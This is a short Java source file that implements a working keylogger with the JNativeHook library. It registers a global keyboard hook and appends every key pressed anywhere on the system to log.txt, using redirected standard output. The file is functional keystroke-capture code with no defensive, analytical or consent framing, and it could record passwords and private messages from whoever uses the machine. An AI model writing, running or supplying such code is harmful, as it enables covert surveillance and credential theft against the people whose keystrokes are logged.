package main;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintStream;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener
{
	public static void main(String[] args) {
		try {
			File file=new File("log.txt");
			FileOutputStream fos = new FileOutputStream(file, true);
			System.setOut(new PrintStream(fos));
		}catch (FileNotFoundException e1) {
			e1.printStackTrace();
		}
		try {
			GlobalScreen.registerNativeHook();
			
		}catch (NativeHookException e) {
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(new Main());
	}
	
	

	
	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("Key Pressed:"+NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		
		
	}

	
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		
		
	}
	

}
